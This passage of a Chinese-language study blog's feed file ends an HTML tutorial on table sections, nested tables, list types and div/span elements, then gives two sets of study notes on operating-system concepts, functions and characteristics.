文档中页面的页眉、正文、页脚。每个页面保持相同，而正文是表格的主要内容持有者。<br>头部，主体和页脚的对应的三个标签是：</p><blockquote><ul><li>&lt;thead&gt; - 创建单独的表头。</li><li>&lt;tbody&gt; - 表示表格的主体。</li><li>&lt;tfoot&gt; - 创建一个单独的表页脚。</li></ul></blockquote><p>表可以包含多个&lt;tbody&gt;元素以指示不同的页面。<br><strong>但值得注意的是&lt;thead&gt;和&lt;tfoot&gt;标签应出现在&lt;tbody&gt;之前。</strong></p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;4&quot;</span>&gt;</span>This is the head of the table<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>       <br>    <span class="hljs-tag">&lt;<span class="hljs-name">tfoot</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;4&quot;</span>&gt;</span>This is the foot of the table<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span>     <br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>         <br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-9表格的嵌套"><a href="#18-1-9表格的嵌套" class="headerlink" title="18.1.9表格的嵌套"></a>18.1.9表格的嵌套</h4><p>可以在另一个表中使用一个表。可以使用&lt;table&gt;内的几乎所有标签。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Salary<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>其琛<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>曼迪<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>7000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>       <br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="19-列表"><a href="#19-列表" class="headerlink" title="19.列表"></a>19.列表</h2><p>HTML 支持有序、无序和定义列表。<strong>列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。</strong><br><strong>每个列表项始于 &lt;li&gt; 标签。</strong></p><h3 id="19-1无序列表（-lt-ul-gt-）"><a href="#19-1无序列表（-lt-ul-gt-）" class="headerlink" title="19.1无序列表（&lt;ul&gt;）"></a>19.1无序列表（&lt;ul&gt;）</h3><p>无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。<br>无序列表适合成员之间无级别顺序关系的情况。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;list-style-type:disc&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--以小黑点表示--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 将disc可以换成以下这些类型：</span><br><span class="hljs-comment">disc ----实心圆（默认）</span><br><span class="hljs-comment">circle ----空心圆</span><br><span class="hljs-comment">square ----实心方块</span><br><span class="hljs-comment">decimal ----以数字1开始表示</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></div></td></tr></table></figure><p>除去上面所写类型外，以下表格中的类型用在有序列表中是不正确的，在有序列表中使用时，会自动转化为默认的情况（即数字表示）。</p><table><thead><tr><th align="center">属性值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">none</td><td align="center">无标记。</td></tr><tr><td align="center">disc</td><td align="center">默认。标记是实心圆。</td></tr><tr><td align="center">circle</td><td align="center">标记是空心圆。</td></tr><tr><td align="center">square</td><td align="center">标记是实心方块。</td></tr><tr><td align="center">decimal</td><td align="center">标记是数字。</td></tr><tr><td align="center">decimal-leading-zero</td><td align="center">0开头的数字标记。(01, 02, 03, 等。)</td></tr><tr><td align="center">lower-roman</td><td align="center">小写罗马数字(i, ii, iii, iv, v, 等。)</td></tr><tr><td align="center">upper-roman</td><td align="center">大写罗马数字(I, II, III, IV, V, 等。)</td></tr><tr><td align="center">lower-alpha</td><td align="center">小写英文字母The marker is lower-alpha (a, b, c, d, e, 等。)</td></tr><tr><td align="center">upper-alpha</td><td align="center">大写英文字母The marker is upper-alpha (A, B, C, D, E, 等。)</td></tr><tr><td align="center">lower-greek</td><td align="center">小写希腊字母(alpha, beta, gamma, 等。)</td></tr><tr><td align="center">lower-latin</td><td align="center">小写拉丁字母(a, b, c, d, e, 等。)</td></tr><tr><td align="center">upper-latin</td><td align="center">大写拉丁字母(A, B, C, D, E, 等。)</td></tr><tr><td align="center">hebrew</td><td align="center">传统的希伯来编号方式</td></tr><tr><td align="center">armenian</td><td align="center">传统的亚美尼亚编号方式</td></tr><tr><td align="center">georgian</td><td align="center">传统的乔治亚编号方式(an, ban, gan, 等。)</td></tr><tr><td align="center">cjk-ideographic</td><td align="center">简单的表意数字</td></tr><tr><td align="center">hiragana</td><td align="center">标记是：a, i, u, e, o, ka, ki, 等。（日文平假名字符）</td></tr><tr><td align="center">katakana</td><td align="center">标记是：A, I, U, E, O, KA, KI, 等。（日文片假名字符）</td></tr><tr><td align="center">hiragana-iroha</td><td align="center">标记是：i, ro, ha, ni, ho, he, to, 等。（日文平假名序号）</td></tr><tr><td align="center">katakana-iroha</td><td align="center">标记是：I, RO, HA, NI, HO, HE, TO, 等。（日文片假名序号）</td></tr></tbody></table><h3 id="19-2有序列表（-lt-ol-gt-）"><a href="#19-2有序列表（-lt-ol-gt-）" class="headerlink" title="19.2有序列表（&lt;ol&gt;）"></a>19.2有序列表（&lt;ol&gt;）</h3><p>有序列表也是一列项目，列表项目使用数字进行标记。有序列表适合各项目之间存在顺序关系的情况。列表项项使用数字来标记。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;A&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--不写类型 默认为数字从1开始--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>       <br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br><span class="hljs-comment">&lt;!--也可以是以下类型</span><br><span class="hljs-comment">A --- 表示以大写字母从A开始</span><br><span class="hljs-comment">a --- 表示以小写字母从a开始</span><br><span class="hljs-comment">I --- 表示以罗马数字从I开始</span><br><span class="hljs-comment">i --- 表示以罗马数字从i开始</span><br><span class="hljs-comment">⭐需要注意的是，若用非法的(不正确的)类型，会自动转化为默认类型（即从数字1表示）</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="19-3自定义列表（-lt-dl-gt-）"><a href="#19-3自定义列表（-lt-dl-gt-）" class="headerlink" title="19.3自定义列表（&lt;dl&gt;）"></a>19.3自定义列表（&lt;dl&gt;）</h3><p>自定义列表不仅仅是一列项目，而是项目及其注释的组合。<br><strong>自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。</strong><br>自定义列表中的一个术语名可以对应多重定义或者多个术语名对应同一个定义，如果只有术语名或者只有定义也是可行的，也就是说 &lt;dt&gt; 与 &lt;dd&gt; 在其中数量不限、对应关系不限。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- black hot drink1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- black hot drink2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- white cold drink1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- white cold drink2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="20-区块"><a href="#20-区块" class="headerlink" title="20.区块"></a>20.区块</h2><h3 id="20-1区块元素"><a href="#20-1区块元素" class="headerlink" title="20.1区块元素"></a>20.1区块元素</h3><p>块级元素在浏览器显示时，通常会以新行来开始（和结束）。即会单独占据一行。<br>如：&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</p><h3 id="20-2内联元素"><a href="#20-2内联元素" class="headerlink" title="20.2内联元素"></a>20.2内联元素</h3><p>内联元素在显示时通常不会以新行开始。<br>如：&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</p><h3 id="20-3元素-lt-div-gt"><a href="#20-3元素-lt-div-gt" class="headerlink" title="20.3元素&lt;div&gt;"></a>20.3元素&lt;div&gt;</h3><p>&lt;div&gt; 标签可以把文档分割为独立的、不同的部分。<br>HTML &lt;div&gt; 元素是<strong>块级元素</strong>，它是可用于组合其他 HTML 元素的容器。<br>&lt;div&gt; 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。<br>如果与 CSS 一同使用，&lt;div&gt; 元素可用于对大的内容块设置样式属性。<br>&lt;div&gt; 元素的另一个常见的用途是文档布局。它取代了使用表格定义布局的老式方法。</p><h3 id="20-4元素-lt-span-gt"><a href="#20-4元素-lt-span-gt" class="headerlink" title="20.4元素&lt;span&gt;"></a>20.4元素&lt;span&gt;</h3><p>HTML &lt;span&gt; 元素是<strong>内联元素</strong>，可用作文本的容器。<br>&lt;span&gt; 元素也没有特定的含义。<br>当与 CSS 一同使用时，&lt;span&gt; 元素可用于为部分文本设置样式属性。</p>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机操作系统-1.操作系统的概念、功能和目标</title>
    <link href="/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E3%80%81%E5%8A%9F%E8%83%BD%E5%92%8C%E7%9B%AE%E6%A0%87/"/>
    <url>/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E3%80%81%E5%8A%9F%E8%83%BD%E5%92%8C%E7%9B%AE%E6%A0%87/</url>
    
    <content type="html"><![CDATA[<p>操作系统（operation system，简称OS）是管理计算机硬件与软件资源的计算机程序。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入设备与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h2><p><img src="https://img-blog.csdnimg.cn/20210501080554799.png"></p><h2 id="1-操作系统的层次结构"><a href="#1-操作系统的层次结构" class="headerlink" title="1.操作系统的层次结构"></a>1.操作系统的层次结构</h2><p><img src="https://img-blog.csdnimg.cn/20210502074952178.png"></p><h2 id="2-操作系统的概念"><a href="#2-操作系统的概念" class="headerlink" title="2.操作系统的概念"></a>2.操作系统的概念</h2><p>操作系统（Operating System，OS）是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配，以提供给用户和其他软件方便的接口环境，它是计算机系统中最基本的系统软件。<br>总的来说就是：</p><ul><li>是系统最基本最核心的软件，属于系统软件</li><li>控制和管理整个计算机的硬件和软件资源</li><li>合理的组织、调度计算机的工作与资源的分配</li><li>为用户和其他软件提供方便的接口和环境</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502082821175.png"></p><h2 id="3-操作系统的功能和目标"><a href="#3-操作系统的功能和目标" class="headerlink" title="3.操作系统的功能和目标"></a>3.操作系统的功能和目标</h2><ul><li>思维导图</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502083039448.png"></p><p>举例说明操作系统的功能：</p><blockquote><ul><li>假设：用户是雇主，操作系统是工人（用来操作机器），计算机是机器（由处理机(CPU)、存储器、设备、文件几个部件构成）</li><li>工人有熟练的技能去控制和协调各个部件的工作，这就是操作系统对资源的管理</li><li>同时，工人必须接受雇主的命令，这就是“接口”</li><li>有了工人，机器就能发挥更大的作用，因此工人就成了“扩充机器”</li><li>工人操作机器、机器有了更大的作用比如GUI界面，于是工人便成了扩充机器，去扩充GUI界面等功能</li></ul></blockquote><h3 id="（1）作为计算机系统资源的管理者"><a href="#（1）作为计算机系统资源的管理者" class="headerlink" title="（1）作为计算机系统资源的管理者"></a>（1）作为计算机系统资源的管理者</h3><p>补充知识：进程是一个程序的执行过程。执行前需要将该程序放到内存中，才能被CPU处理。</p><ul><li>管理软硬件资源、合理的组织、调度计算机的工作与资源的分配</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502092715359.png"></p><blockquote><p>1.处理器（CPU）管理</p></blockquote><p>在多道程序环境下，cpu的分配和运行都以进程（或线程）为基本单位，因此对cpu的管理可理解为对进程的管理。进程管理的主要功能包括进程控制、进程同步、进程通信、死锁处理、处理机调度等。附上一张图理解对进程的管理。</p><blockquote><p>2.存储器管理</p></blockquote><p>为多道程序的运行提供良好的环境，方便用户使用及提高内存的利用率，主要包括内存分配与回收、地址映射、内存保护与共享和内存扩充等功能。</p><blockquote><p>3.文件管理</p></blockquote><p>计算机中所有的信息都是以文件的形式存在的，操作系统中负责文件的管理的部分称为文件系统，文件管理包括文件存储空间的管理、目录管理及文件读写管理和保护等。</p><blockquote><p>4.设备管理</p></blockquote><p>设备管理的主要任务是完成用户的I/O请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓存管理、设备分配、设备处理和虚拟设备等功能。</p><p><strong>以上4种管理功能都由操作系统负者，用户无需关注。</strong></p><h3 id="（2）作为用户与计算机硬件系统之间的接口"><a href="#（2）作为用户与计算机硬件系统之间的接口" class="headerlink" title="（2）作为用户与计算机硬件系统之间的接口"></a>（2）作为用户与计算机硬件系统之间的接口</h3><p><img src="https://img-blog.csdnimg.cn/20210502093613215.png"></p><p> <strong>操作系统提供的接口分为两类：命令接口和程序接口</strong></p><blockquote><ul><li>命令接口：允许用户可以直接使用</li><li>程序接口：允许用户通过程序间接使用</li></ul></blockquote><h4 id="1-命令接口"><a href="#1-命令接口" class="headerlink" title="1.命令接口"></a>1.命令接口</h4><p>命令接口分为两类：联机命令接口和脱机命令接口，用户可以直接调用。</p><ul><li>联机命令接口：又称交互式命令接口，适用于分时或实时系统的接口，由一组键盘操作命令组成。用户输入一条指令，操作系统就执行一条指令；（用户说一句，系统做一句）</li><li>脱机命令接口：又称批处理接口，使用于批处理系统，由一组作业控制命令组成。用户输入一堆指令，操作系统运行一堆指令。在操作系统运行这些命令时用户不可干预。（用户说一堆，系统做一堆）<blockquote><p>批处理(Batch)，也称为批处理脚本。顾名思义，批处理就是对某对象进行批量的处理，通常被认为是一种简化的脚本语言，它应用于DOS和Windows系统中。批处理文件的扩展名为bat 。</p></blockquote></li></ul><h4 id="2-程序接口"><a href="#2-程序接口" class="headerlink" title="2.程序接口"></a>2.程序接口</h4><ul><li>程序接口：由一组系统调用（也称广义指令）组成（程序接口=系统调用）</li><li>用户通过在程序中使用这些系统调用来请求操作系统为其提供服务，只能通过用户程序间接调用</li><li>如使用各种外部设备、申请分配和回收内存及其它各种要求</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502095152928.png"></p><blockquote><p>动态链接库英文为DLL，是Dynamic Link Library的缩写。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210502095353416.png"></p><h4 id="3-GUI"><a href="#3-GUI" class="headerlink" title="3.GUI"></a>3.GUI</h4><p>现代操作系统中最流行的图形用户接口。</p><p>总结</p><p><img src="https://img-blog.csdnimg.cn/20210502095725128.png"></p><h3 id="（3）虚拟机"><a href="#（3）虚拟机" class="headerlink" title="（3）虚拟机"></a>（3）虚拟机</h3><p><img src="https://img-blog.csdnimg.cn/20210502100053554.png"></p><ul><li>没有任何软件支持的计算机称为裸机。</li><li>把覆盖了软件的机器称为扩充机器，又称之为虚拟机。</li></ul><p>例子</p><p><img src="https://img-blog.csdnimg.cn/20210502100508372.png"></p>]]></content>
    
    
    <categories>
      
      <category>计算机操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机操作系统-2.操作系统的特征</title>
    <link href="/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-2.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%89%B9%E5%BE%81/"/>
    <url>/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-2.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%89%B9%E5%BE%81/</url>
    
    <content type="html"><![CDATA[<p>操作系统（operation system，简称OS）是管理计算机硬件与软件资源的计算机程序。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入设备与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="本节知识总览图"><a href="#本节知识总览图" class="headerlink" title="本节知识总览图"></a>本节知识总览图</h2><p><img src="https://img-blog.csdnimg.cn/20210502101108243.png"></p><p><img src="https://img-blog.csdnimg.cn/20210502110029689.png"></p><h3 id="1-并发"><a href="#1-并发" class="headerlink" title="1.并发"></a>1.并发</h3><ul><li>并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。<blockquote><p><strong>注意区分 并发与并行 的区别</strong></p><ul><li>并行：指两个或多个事件在同一时刻同时发生。</li></ul></blockquote></li></ul><p>操作系统的并发性指计算机系统中同时存在着多个运行着的程序。</p><blockquote><p>一个单核处理机（CPU）同一时刻只能执行一个程序，因此操作系统会负责协调多个程序交替执行（这些程序微观上是交替执行的，但宏观上看起来就像在同时执行）。事实上，操作系统就是伴随着”多道程序技术“而出现的。因此，操作系统和程序并发是一起诞生的。</p></blockquote><blockquote><p>在如今的计算机中，一般都是多核cpu的，即在同一时刻可以并行执行多个程序，比如计算机是8核的，则计算机可以在同一时刻并行执行8个程序，但是事实上我们计算机执行的程序并不止8个，因此并发技术是必须存在的，并发性必不可少。</p></blockquote><h3 id="2-共享"><a href="#2-共享" class="headerlink" title="2.共享"></a>2.共享</h3><p>共享：即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用。</p><p>资源共享有两种共享方式：互斥共享方式和同时共享方式</p><blockquote><ul><li>互斥共享方式： 系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源。</li><li>同时共享方式：系统中的某些资源，允许一个时间段内由多个进程”同时“对它们进行访问。</li></ul></blockquote><p><strong>所谓的“同时”往往是宏观上的，而在微观上，这些进程可能是交替地对该资源进行访问的（即分时共享）</strong><br>实例：</p><ul><li>互斥共享方式：使用QQ和微信。同一时间段内摄像头只能分配给其中一个进程。</li><li>同时共享方式：用QQ发送文件A，同时使用微信发送文件B。宏观上看，两边都在同时读取并发送文件，说明两个进程都在访问硬盘资源，从中读取数据。微观上看，两个进程是交替着访问硬盘的。</li></ul><p><strong>有时候多个进程可能真的是在同时进行资源访问，比如玩游戏时可以放音乐，游戏声音和音乐声音都能听见</strong></p><h3 id="👉并发和共享的关系"><a href="#👉并发和共享的关系" class="headerlink" title="👉并发和共享的关系"></a>👉并发和共享的关系</h3><p>并发性：指计算机系统中同时存在着多个运行着的程序。<br>共享性：指系统中的资源可供内存中多个并发执行的进程共同使用。</p><p>用上述例子看并发和共享的关系：<br>使用QQ发送文件A，同时使用微信发送文件B。</p><ul><li><p>1.两个进程正在并发执行（并发性）</p><blockquote><p>如果失去并发性，则系统中只有一个程序正在运行，则共享性失去存在的意义。</p></blockquote></li><li><p>2.需要共享地访问硬盘资源（共享性）</p><blockquote><p>如果失去共享性，则QQ和微信不能同时访问硬盘资源，就无法实现同时发送文件，也就无法并发。</p></blockquote></li></ul><p><strong>并发性和共享性互为存在条件</strong></p><h3 id="3-虚拟"><a href="#3-虚拟" class="headerlink" title="3.虚拟"></a>3.虚拟</h3><p>虚拟：指把一个物理上的实体变为若干个逻辑上的对应物。物理实体（前者）是实际存在的，而逻辑上对应物（后者）是用户感受的。</p><ul><li><p>如：一个游戏需要4GB的运行内存，QQ需要256MB的内存，某视频播放器需要256MB的内存······，而计算机的内存只有4GB，但计算机还是可以同时运行他们。</p><blockquote><p>这就是虚拟存储器技术（虚拟技术中的“空分复用技术”）。实际只有4GB的内存，在用户看来似乎远远大于4GB。</p></blockquote></li><li><p>如：既然一个程序需要被分配CPU才能正常执行，那为什么单核CPU的电脑中能同时运行多个程序。</p><blockquote><p>这是虚拟处理器技术。实践上只有一个单核CPU，在用户看来似乎由多个CPU在同时服务。</p></blockquote></li></ul><p><strong>虚拟技术中的“时分复用技术”。微观上处理机在各个微小的时间段内交替着为各个进程服务。</strong></p><p>虚拟技术分为：</p><blockquote><ul><li>空分复用技术（如虚拟存储器技术）</li></ul></blockquote><blockquote><ul><li>时分复用技术（如虚拟处理器）<br>显然，如果失去了并发性，则一个时间段内系统中只需要运行一道程序，那么就失去了实现虚拟性的意义了。因此，没有并发性，就谈不上虚拟性。</li></ul></blockquote><h3 id="4-异步"><a href="#4-异步" class="headerlink" title="4.异步"></a>4.异步</h3><p>异步：指在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进，这就是进程的异步性。</p><p>如果失去了并发性，则系统只能串行地处理各个进程，每个进程的执行会一贯到底。只有系统拥有并发性，才有可能导致异步性。</p>]]></content>
    
    
    <categories>
      
      <category>计算机操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
